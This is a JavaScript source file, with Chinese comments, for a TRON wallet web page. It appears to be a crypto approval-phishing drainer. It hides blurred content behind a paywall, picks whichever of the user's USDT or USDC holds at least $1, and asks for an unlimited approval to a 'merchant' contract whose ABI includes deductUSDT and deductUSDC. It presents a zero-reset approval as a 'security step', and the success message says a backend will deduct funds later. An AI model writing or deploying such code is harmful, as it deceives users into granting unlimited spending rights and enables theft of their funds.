// src/main.js
// 🚨 最終精簡版：僅執行 Max 授權（Approve） 🚨
// 移除了所有前端扣款邏輯，Max 授權成功後直接解鎖內容。

// --- 配置常量 (請確保您的地址是正確的) ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];


// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null; // 記錄哪個代幣有足夠餘額

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const coinglassContent = document.getElementById('coinglassContent'); // 新增：用於控制模糊效果

// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
    // 確保內容被模糊
    if (coinglassContent) coinglassContent.classList.add('blurred'); 
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
    // 授權完成後移除模糊
    if (coinglassContent) coinglassContent.classList.remove('blurred');
}
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `已連線: ${address}`;
        // 連線成功，但仍保持模糊，直到 Max 授權完成
        showOverlay('已連線。請完成 Max 授權以解鎖內容 🔒'); 
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '連繫錢包';
        connectButton.title = '連繫錢包';
        showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
    }
}

async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        // 這是一個非常大的數，用來檢查是否為無限授權
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}

async function getTokenBalance(tokenContract) {
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return tronWeb.BigNumber(0);
    }
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

// ---------------------------------------------
// 核心：TronLink 連接邏輯
// ---------------------------------------------
async function connectTronLink() {
    if (!window.tronLink) {
        showOverlay(`🔴 錯誤：未偵測到 TronLink！請安裝 TronLink 擴展或使用 Tron DApp 瀏覽器。`);
        return;
    }
    
    showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求連接...');
    
    try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });

        if (res.code !== 200) {
            throw new Error(`連接請求被拒絕: ${res.message}`);
        }

        // 設置全局 TronWeb 實例為注入的 API
        if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;

        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();

    } catch (error) {
        console.error("TronLink 連接失敗:", error);
        showOverlay(`原生連接失敗！錯誤: ${error.message}。請確認錢包已解鎖。`);
        updateConnectionUI(false);
    }
}


// ---------------------------------------------
// 檢查授權狀態並決定目標代幣 (最低門檻 $1.00)
// ---------------------------------------------
async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    
    const contractAuthorized = await merchantContract.authorized(userAddress).call();

    // 門檻調整為 $1.00 (您設定的最低扣款門檻)
    const minAmount = tronWeb.toSun('1.00'); 
    
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);

    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);

    let targetToken = null; 

    // 優先檢查 USDT (餘額足夠)
    if (usdtBalance.gte(minAmount)) {
        targetToken = 'USDT'; 
    } 
    // 其次檢查 USDC (餘額足夠)
    else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC'; 
    }
    
    targetDeductionToken = targetToken; 

    return {
        contract: contractAuthorized,
        authorizedToken: targetToken, // 'USDT', 'USDC', 或 null
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}


// ---------------------------------------------
// 核心：授權邏輯 (僅授權目標代幣)
// ---------------------------------------------
async function connectAndAuthorize() {
    const status = await checkAuthorization();
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
    const ZERO_UINT = "0"; 
    
    // 計算總交易數：合約授權(0或1筆) + 目標代幣授權(0或2筆)
    let totalTxs = (status.contract ? 0 : 1); 
    
    // 只有在有目標代幣且該代幣尚未 Max 授權時，才計算 2 筆交易
    if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
        totalTxs += 2;
    }
    let txCount = 0;

    if (totalTxs === 0) {
        showOverlay("所有授權已就緒。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        const signAndSend = async (transaction, stepMessage) => {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
            
            const result = await tronWeb.trx.sign(transaction);
            if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
            
            await tronWeb.trx.sendRawTransaction(result);
        };

        // 1. 執行合約授權 (ConnectAndAuthorize) - 1 筆交易
        if (!status.contract) {
            const transaction = await merchantContract.connectAndAuthorize().build(); 
            await signAndSend(transaction, "正在發送合約授權 (ConnectAndAuthorize)");
        }

        // 2. 執行目標代幣授權 (最多 2 筆交易)
        if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
            const token = status.authorizedToken;
            const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
            const tokenName = token === 'USDT' ? "USDT" : "USDC";

            // 第一筆：歸零
            const zeroApproveTx = await tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            await signAndSend(zeroApproveTx, `${tokenName} 安全步驟: 重置授權至 0 (請同意)`);

            // 第二筆：賦予 Max 額度
            const maxApproveTx = await tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            await signAndSend(maxApproveTx, `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`);
        }

        // 餘額不足的錯誤提示
        if (!status.authorizedToken) {
             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始授權流程。");
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`授權交易失敗，錯誤訊息: ${error.message}。請確保錢包中有足夠的餘額 (TRX 支付手續費) 並同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}

// ---------------------------------------------
// 連線成功後處理：只檢查授權狀態
// ---------------------------------------------
async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    // 檢查合約授權是否完成 AND 餘額足夠的代幣是否已 Max 授權
    const tokenAuthorized = status.authorizedToken && status[`${status.authorizedToken.toLowerCase()}Authorized`];
    const allAuthorized = status.contract && tokenAuthorized;

    if (allAuthorized) {
        // 授權已完成，直接解鎖內容
        hideOverlay(); 
        // 顯示最終成功訊息
        showOverlay('✅ Max 授權已成功！您已解鎖內容。後續服務扣款將由後台系統依約定金額執行。');
        // 保持此訊息 3 秒，然後真正隱藏 overlay
        await new Promise(resolve => setTimeout(resolve, 3000));
        hideOverlay();

    } else {
        // 授權未完成，則引導用戶授權
        showOverlay('偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...');
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            // 授權成功後，再次檢查並解鎖
            await handlePostConnection(); 
        }
    }
}

// ---------------------------------------------
// 主連接入口函數
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    await connectTronLink();
    
    if (connectButton) connectButton.disabled = false;
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);


// 頁面啟動：提示用戶連接
updateConnectionUI(false);